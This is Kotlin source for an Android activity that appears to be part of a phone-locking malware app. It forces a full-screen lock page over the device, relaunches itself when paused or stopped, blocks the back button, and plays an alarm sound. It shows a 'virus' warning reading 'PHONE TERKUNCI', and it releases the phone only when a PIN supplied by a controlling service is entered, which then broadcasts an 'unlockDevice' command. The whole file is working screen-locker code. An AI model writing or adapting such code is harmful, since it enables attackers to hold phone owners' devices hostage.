package com.sync.xxx

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.media.MediaPlayer
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

class LockNewActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private var mediaPlayer: MediaPlayer? = null
    private var correctPin: String = ""
    private var lockTitle: String  = "Perangkat Terkunci"
    private var customHtml: String = ""
    private var isReceiverRegistered = false
    private var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON   or
                android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
            )
        }
        try {
            val km = getSystemService(KEYGUARD_SERVICE) as android.app.KeyguardManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                km.requestDismissKeyguard(this, null)
            }
        } catch (_: Exception) {}

        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: ""
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: "Perangkat Terkunci"
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: ""

        setupWebView()
        registerUnlockReceiver()
        playLockSound()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        correctPin = intent?.getStringExtra(LockOverlayService.EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(LockOverlayService.EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(LockOverlayService.EXTRA_CUSTOM_HTML) ?: customHtml
    }

    // AppCompatActivity — pakai onBackPressedDispatcher, bukan override onBackPressed
    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (!isUnlocked) return
        @Suppress("DEPRECATION")
        super.onBackPressed()
    }

    override fun onPause() {
        super.onPause()
        if (isUnlocked) return
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            if (isUnlocked) return@postDelayed
            startActivity(Intent(this, LockNewActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                putExtra(LockOverlayService.EXTRA_PIN,         correctPin)
                putExtra(LockOverlayService.EXTRA_TITLE,       lockTitle)
                putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
            })
        }, 300)
    }

    override fun onStop() {
        super.onStop()
        if (isUnlocked) return
        startActivity(Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra(LockOverlayService.EXTRA_PIN,         correctPin)
            putExtra(LockOverlayService.EXTRA_TITLE,       lockTitle)
            putExtra(LockOverlayService.EXTRA_CUSTOM_HTML, customHtml)
        })
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
        }
        webView.setBackgroundColor(android.graphics.Color.BLACK)
        webView.addJavascriptInterface(LockBridge(), "LockBridge")
        webView.webViewClient = WebViewClient()
        if (customHtml.isNotEmpty()) {
            webView.loadDataWithBaseURL(null, buildCustomLockHtml(customHtml), "text/html", "UTF-8", null)
        } else {
            webView.loadDataWithBaseURL(null, buildLockHtml(), "text/html", "UTF-8", null)
        }
        setContentView(webView)
    }

    private fun buildCustomLockHtml(body: String): String = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{width:100%;height:100%;background:#000;overflow:hidden;display:flex;align-items:center;justify-content:center}
#wrap{width:100%;height:100%;display:flex;align-items:center;justify-content:center}
</style>
</head>
<body><div id="wrap">${body}</div></body>
</html>""".trimIndent()

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockNewActivity", "registerReceiver: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        mediaPlayer?.release()
        mediaPlayer = null
        webView.destroy()
    }

    inner class LockBridge {
        @JavascriptInterface
        fun tryUnlock(pin: String): Boolean {
            val ok = (pin == correctPin)
            if (ok) {
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    try {
                        sendBroadcast(Intent(DeviceService.ACTION_COMMAND).apply {
                            putExtra(DeviceService.EXTRA_COMMAND, "unlockDevice")
                            putExtra(DeviceService.EXTRA_VALUE, "true")
                            setPackage(packageName)
                        })
                    } catch (_: Exception) {}
                    sendBroadcast(Intent("com.sync.xxx.UNLOCK").apply { setPackage(packageName) })
                }
            }
            return ok
        }

        @JavascriptInterface
        fun getLockTitle(): String = lockTitle
    }

    private fun playLockSound() {
        try {
            val afd = resources.openRawResourceFd(R.raw.lock) ?: return
            mediaPlayer = MediaPlayer().apply {
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                prepare()
                start()
                setOnCompletionListener { release(); mediaPlayer = null }
            }
        } catch (_: Exception) {}
    }

    private fun buildLockHtml(): String {
        val safeTitle = lockTitle
            .replace("&", "&amp;").replace("<", "&lt;").replace("\"", "&quot;")
        return """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0305;--red:#ff2b3b;--green:#ff2b3b;--text:#ffe6e8;--text2:#dd4455;--text3:#5a1a1f;}
html,body{height:100%;width:100%;overflow:hidden;touch-action:none}
body{background:var(--bg);font-family:'Outfit',sans-serif;-webkit-font-smoothing:antialiased;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:32px 28px;position:relative;overflow:hidden;}
.crack-layer{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;}
.crack-layer svg{width:100%;height:100%;opacity:0.18;}
body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,40,55,.02) 2px,rgba(255,40,55,.02) 4px);pointer-events:none;z-index:1;animation:scanMove 8s linear infinite;}
@keyframes scanMove{0%{background-position:0 0}100%{background-position:0 100px}}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 50% at 50% -5%,rgba(255,30,45,.18) 0%,transparent 60%),radial-gradient(ellipse 50% 40% at 10% 90%,rgba(200,20,20,.08) 0%,transparent 55%);pointer-events:none;z-index:0;}
@keyframes glitch{0%,94%,100%{clip-path:none;transform:none;opacity:1}95%{clip-path:inset(30% 0 40% 0);transform:translateX(-4px);opacity:.85}97%{clip-path:inset(60% 0 10% 0);transform:translateX(4px);opacity:.9}99%{clip-path:inset(5% 0 80% 0);transform:translateX(-2px)}}
#introScreen{position:fixed;inset:0;background:radial-gradient(ellipse 70% 60% at 50% 40%,#1a0507 0%,#050203 75%);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:100;gap:26px;animation:introDismiss .4s ease forwards 4s;}
@keyframes introDismiss{0%{opacity:1;transform:none}100%{opacity:0;transform:scale(1.06);pointer-events:none}}
.lock-icon-frame{width:132px;height:132px;border-radius:32px;background:linear-gradient(160deg,#1c0a0d,#0c0405);display:flex;align-items:center;justify-content:center;position:relative;border:1px solid rgba(255,50,65,.35);box-shadow:0 0 0 1px rgba(0,0,0,.6),0 0 40px rgba(255,30,45,.35),0 0 80px rgba(255,20,40,.15),inset 0 1px 0 rgba(255,90,100,.12),inset 0 -12px 24px rgba(0,0,0,.5);animation:frameGlow 2.4s ease-in-out infinite,popIn .55s cubic-bezier(.16,1,.3,1) both;}
@keyframes frameGlow{0%,100%{box-shadow:0 0 0 1px rgba(0,0,0,.6),0 0 34px rgba(255,30,45,.3),0 0 70px rgba(255,20,40,.12),inset 0 1px 0 rgba(255,90,100,.1),inset 0 -12px 24px rgba(0,0,0,.5)}50%{box-shadow:0 0 0 1px rgba(0,0,0,.6),0 0 55px rgba(255,30,45,.55),0 0 110px rgba(255,20,40,.22),inset 0 1px 0 rgba(255,110,120,.16),inset 0 -12px 24px rgba(0,0,0,.5)}}
.lock-icon-svg{filter:drop-shadow(0 0 10px rgba(255,40,55,.8)) drop-shadow(0 0 26px rgba(255,20,40,.5));animation:lockBreathe 2.4s ease-in-out infinite;}
@keyframes lockBreathe{0%,100%{transform:scale(1)}50%{transform:scale(1.045)}}
.lock-ring{position:absolute;inset:-14px;border-radius:44px;border:1px solid rgba(255,40,55,.18);animation:ringPulse 2.4s ease-in-out infinite;}
@keyframes ringPulse{0%,100%{opacity:.5;transform:scale(1)}50%{opacity:0;transform:scale(1.08)}}
.intro-title{font-family:'JetBrains Mono',monospace;font-size:20px;letter-spacing:3px;text-transform:uppercase;color:#ff3b4a;text-align:center;line-height:1.8;text-shadow:0 0 14px rgba(255,40,55,.6);}
.intro-title .line{display:block;overflow:hidden;white-space:nowrap;}
.intro-title .line1{animation:typeIn .6s steps(22,end) .3s both}
.intro-title .line2{animation:typeIn .5s steps(18,end) 1.1s both}
.intro-title .line3{animation:typeIn .7s steps(26,end) 1.8s both}
@keyframes typeIn{from{width:0;opacity:0}to{opacity:1}}
.intro-bar-wrap{width:220px;height:3px;background:rgba(255,30,45,.15);border-radius:2px;overflow:hidden;}
.intro-bar{height:100%;width:0%;background:linear-gradient(90deg,#ff2b3b,#ff5a63,#ff2b3b);border-radius:2px;animation:barFill 2.5s ease .5s forwards;box-shadow:0 0 10px #ff2b3b;}
@keyframes barFill{to{width:100%}}
#mainContent{display:flex;flex-direction:column;align-items:center;position:relative;z-index:2;opacity:0;animation:mainIn .6s ease forwards 4.4s;width:100%;}
@keyframes mainIn{to{opacity:1}}
.virus-wrap{position:relative;width:100px;height:100px;margin-bottom:22px;flex-shrink:0;}
.virus-bg{width:100px;height:100px;border-radius:50%;background:radial-gradient(circle at 40% 35%,rgba(255,40,55,.14),rgba(80,10,10,.05));border:1px solid rgba(255,40,55,.28);display:flex;align-items:center;justify-content:center;position:relative;z-index:1;animation:virusPulse 2.5s ease-in-out infinite;}
@keyframes virusPulse{0%,100%{box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 30px rgba(255,30,45,.18)}50%{box-shadow:0 0 0 1px rgba(0,0,0,.5),0 0 60px rgba(255,30,45,.4),0 0 90px rgba(255,20,40,.12)}}
.v-orbit{position:absolute;inset:-12px;border-radius:50%;border:1px solid rgba(255,40,55,.15);animation:orbitSpin 6s linear infinite;}
.v-orbit2{position:absolute;inset:-22px;border-radius:50%;border:1px dashed rgba(255,40,55,.08);animation:orbitSpin 10s linear infinite reverse;}
.v-orbit::before,.v-orbit::after{content:'';position:absolute;width:6px;height:6px;border-radius:50%;background:var(--green);top:50%;left:-3px;margin-top:-3px;box-shadow:0 0 8px var(--green),0 0 16px var(--green);}
.v-orbit::after{left:auto;right:-3px;}
@keyframes orbitSpin{to{transform:rotate(360deg)}}
.virus-svg{animation:virusSpin 8s linear infinite;}
@keyframes virusSpin{to{transform:rotate(360deg)}}
.lock-title{font-size:22px;font-weight:800;color:var(--text);text-align:center;letter-spacing:-.3px;line-height:1.2;margin-bottom:4px;animation:glitch 7s ease infinite;text-shadow:0 0 20px rgba(255,30,45,.35);}
.lock-sub{font-family:'JetBrains Mono',monospace;font-size:9px;color:#5a1a1f;letter-spacing:2.5px;text-transform:uppercase;text-align:center;margin-bottom:30px;}
.pin-wrap{display:flex;gap:16px;justify-content:center;margin-bottom:10px;}
.pin-dot{width:14px;height:14px;border-radius:50%;border:1.5px solid rgba(255,40,55,.25);background:transparent;transition:background .18s,border-color .18s,box-shadow .18s,transform .18s;}
.pin-dot.filled{background:var(--green);border-color:var(--green);box-shadow:0 0 14px rgba(255,30,45,.85),0 0 28px rgba(255,20,40,.45);transform:scale(1.12);}
.pin-dot.error{border-color:#ff2b3b;background:rgba(255,20,20,.3);box-shadow:0 0 12px rgba(255,40,40,.6);animation:shake .38s ease;}
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-7px)}75%{transform:translateX(7px)}}
.pin-status{height:24px;margin-bottom:28px;font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:2px;text-transform:uppercase;text-align:center;color:#5a1a1a;transition:color .2s;}
.pin-status.err{color:#ff3333}
.pin-status.ok{color:var(--green);text-shadow:0 0 10px var(--green)}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;width:100%;max-width:292px;}
.key{height:66px;border-radius:14px;border:1px solid rgba(255,50,65,.22);background:linear-gradient(160deg,rgba(255,40,55,.09),rgba(60,10,15,.06));color:var(--text);display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;-webkit-tap-highlight-color:transparent;transition:transform .1s,background .1s,border-color .1s,box-shadow .1s;position:relative;overflow:hidden;user-select:none;box-shadow:0 2px 10px rgba(0,0,0,.55),inset 0 1px 0 rgba(255,80,90,.08);}
.key .num{font-size:22px;font-weight:700;line-height:1;letter-spacing:-.3px;color:#ffe6e8;}
.key .sub{font-family:'JetBrains Mono',monospace;font-size:7px;letter-spacing:2px;color:#dd4455;margin-top:3px}
.key.del{color:var(--text2)}
.key.empty{pointer-events:none;opacity:0;background:transparent;border-color:transparent;box-shadow:none}
.key:active{transform:scale(.93);background:linear-gradient(160deg,rgba(255,40,55,.22),rgba(90,10,15,.14));border-color:rgba(255,50,65,.5);}
.data-stream{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden;}
.data-col{position:absolute;top:-100%;font-family:'JetBrains Mono',monospace;font-size:11px;color:rgba(255,40,55,.13);line-height:1.4;animation:dataFall linear infinite;white-space:pre;}
@keyframes dataFall{to{top:110%}}
.virus-wrap{animation:popIn .5s cubic-bezier(.16,1,.3,1) both}
@keyframes popIn{from{opacity:0;transform:scale(.7)}to{opacity:1;transform:none}}
.lock-title{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .08s both}
.lock-sub{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .13s both}
.pin-wrap{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .18s both}
.pin-status{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .22s both}
.keypad{animation:fadeUp .45s cubic-bezier(.16,1,.3,1) .27s both}
@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
</style>
</head>
<body>
<div id="introScreen">
  <div class="lock-icon-frame">
    <div class="lock-ring"></div>
    <svg class="lock-icon-svg" width="60" height="60" viewBox="0 0 100 100" fill="none">
      <path d="M32 44V32C32 20.4 40.5 11 51 11C60 11 67.5 17.8 69.3 27" stroke="#ff2b3b" stroke-width="7" stroke-linecap="round" fill="none"/>
      <rect x="24" y="44" width="52" height="42" rx="10" fill="rgba(255,40,55,.1)" stroke="#ff2b3b" stroke-width="6"/>
      <circle cx="50" cy="61" r="6" fill="#ff2b3b"/>
      <rect x="47" y="65" width="6" height="12" rx="3" fill="#ff2b3b"/>
    </svg>
  </div>
  <div class="intro-title">
    <span class="line line1">HAII BROOO</span>
    <span class="line line2">GENETICAL SYSTEM</span>
    <span class="line line3">PHONE TERKUNCI</span>
  </div>
  <div class="intro-bar-wrap"><div class="intro-bar"></div></div>
  <div style="font-family:'JetBrains Mono',monospace;font-size:10px;letter-spacing:2px;color:#ff2b3b;" id="pctNum">0%</div>
</div>
<div class="data-stream" id="dataStream"></div>
<div class="crack-layer">
  <svg viewBox="0 0 400 800" preserveAspectRatio="xMidYMid slice">
    <g stroke="#ff2b3b" stroke-linecap="round" fill="none">
      <polyline points="60,0 80,90 50,140 90,200 60,240" stroke-width="1.2"/>
      <polyline points="80,90 120,110 160,95" stroke-width=".7"/>
      <polyline points="200,150 170,220 210,280 180,340 220,400" stroke-width="1.4"/>
      <polyline points="320,0 300,60 340,120 310,180 350,230" stroke-width="1.1"/>
    </g>
  </svg>
</div>
<div id="mainContent">
  <div class="virus-wrap">
    <div class="v-orbit"></div>
    <div class="v-orbit2"></div>
    <div class="virus-bg">
      <svg class="virus-svg" width="52" height="52" viewBox="0 0 100 100" fill="none">
        <circle cx="50" cy="50" r="22" fill="rgba(255,40,55,.08)" stroke="#ff2b3b" stroke-width="1.8"/>
        <circle cx="50" cy="50" r="4" fill="rgba(255,40,55,.5)" stroke="#ff2b3b" stroke-width="1"/>
        <line x1="50" y1="22" x2="50" y2="10" stroke="#ff2b3b" stroke-width="1.8" stroke-linecap="round"/>
        <circle cx="50" cy="8" r="3.5" fill="rgba(255,40,55,.3)" stroke="#ff2b3b" stroke-width="1.2"/>
        <line x1="78" y1="50" x2="90" y2="50" stroke="#ff2b3b" stroke-width="1.8" stroke-linecap="round"/>
        <circle cx="92" cy="50" r="3.5" fill="rgba(255,40,55,.3)" stroke="#ff2b3b" stroke-width="1.2"/>
        <line x1="50" y1="78" x2="50" y2="90" stroke="#ff2b3b" stroke-width="1.8" stroke-linecap="round"/>
        <circle cx="50" cy="92" r="3.5" fill="rgba(255,40,55,.3)" stroke="#ff2b3b" stroke-width="1.2"/>
        <line x1="22" y1="50" x2="10" y2="50" stroke="#ff2b3b" stroke-width="1.8" stroke-linecap="round"/>
        <circle cx="8" cy="50" r="3.5" fill="rgba(255,40,55,.3)" stroke="#ff2b3b" stroke-width="1.2"/>
      </svg>
    </div>
  </div>
  <div class="lock-title">${safeTitle}</div>
  <div class="lock-sub">Enter Pin To Unlock</div>
  <div class="pin-wrap">
    <div class="pin-dot" id="d0"></div><div class="pin-dot" id="d1"></div>
    <div class="pin-dot" id="d2"></div><div class="pin-dot" id="d3"></div>
  </div>
  <div class="pin-status" id="pinStatus">Ketuk angka untuk memasukkan PIN</div>
  <div class="keypad" id="keypad">
    <div class="key" data-n="1"><span class="num">1</span></div>
    <div class="key" data-n="2"><span class="num">2</span><span class="sub">ABC</span></div>
    <div class="key" data-n="3"><span class="num">3</span><span class="sub">DEF</span></div>
    <div class="key" data-n="4"><span class="num">4</span><span class="sub">GHI</span></div>
    <div class="key" data-n="5"><span class="num">5</span><span class="sub">JKL</span></div>
    <div class="key" data-n="6"><span class="num">6</span><span class="sub">MNO</span></div>
    <div class="key" data-n="7"><span class="num">7</span><span class="sub">PQRS</span></div>
    <div class="key" data-n="8"><span class="num">8</span><span class="sub">TUV</span></div>
    <div class="key" data-n="9"><span class="num">9</span><span class="sub">WXYZ</span></div>
    <div class="key empty"></div>
    <div class="key" data-n="0"><span class="num">0</span></div>
    <div class="key del" data-del="1">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
        <line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>
      </svg>
    </div>
  </div>
</div>
<script>
(function(){var el=document.getElementById('pctNum');var start=null;var dur=2500;function step(ts){if(!start)start=ts+500;var p=Math.min(1,Math.max(0,(ts-start)/dur));el.textContent=Math.floor(p*100)+'%';if(p<1)requestAnimationFrame(step);}requestAnimationFrame(step);})();
setTimeout(function(){var i=document.getElementById('introScreen');i.style.pointerEvents='none';setTimeout(function(){i.style.display='none';},400);},4000);
(function(){var chars='01アイウエオカキクケコABCDEF';var c=document.getElementById('dataStream');var cols=Math.floor(window.innerWidth/22);for(var i=0;i<cols;i++){var col=document.createElement('div');col.className='data-col';col.style.left=(i*22)+'px';col.style.animationDuration=(6+Math.random()*14)+'s';col.style.animationDelay=(Math.random()*-20)+'s';col.style.opacity=(.04+Math.random()*.1).toString();var txt='';for(var j=0;j<32;j++){txt+=chars[Math.floor(Math.random()*chars.length)]+'\n';}col.textContent=txt;c.appendChild(col);}})();
var pin='',blocked=false;
document.getElementById('keypad').addEventListener('touchend',function(e){e.preventDefault();var k=e.target.closest('.key');if(!k||k.classList.contains('empty'))return;if(k.dataset.del){doDelete();return;}if(k.dataset.n!==undefined)doPress(k.dataset.n);},{passive:false});
document.getElementById('keypad').addEventListener('click',function(e){if(e.sourceCapabilities&&e.sourceCapabilities.firesTouchEvents)return;var k=e.target.closest('.key');if(!k||k.classList.contains('empty'))return;if(k.dataset.del){doDelete();return;}if(k.dataset.n!==undefined)doPress(k.dataset.n);});
function doPress(n){if(blocked||pin.length>=4)return;pin+=n;updateDots();if(pin.length===4)setTimeout(checkPin,150);}
function doDelete(){if(blocked)return;pin=pin.slice(0,-1);updateDots();setStatus('',false,false);}
function updateDots(){for(var i=0;i<4;i++){var d=document.getElementById('d'+i);d.classList.toggle('filled',i<pin.length);d.classList.remove('error');}}
function checkPin(){var ok=false;try{ok=LockBridge.tryUnlock(pin);}catch(e){}if(ok){setStatus('PIN Benar \u2713',false,true);}else{setStatus('PIN Salah!',true,false);for(var i=0;i<4;i++)document.getElementById('d'+i).classList.add('error');blocked=true;setTimeout(function(){pin='';blocked=false;updateDots();setStatus('',false,false);},1200);}}
function setStatus(msg,isErr,isOk){var el=document.getElementById('pinStatus');el.textContent=msg||'Ketuk angka untuk memasukkan PIN';el.className='pin-status'+(isErr?' err':isOk?' ok':'');}
</script>
</body>
</html>"""
    }
}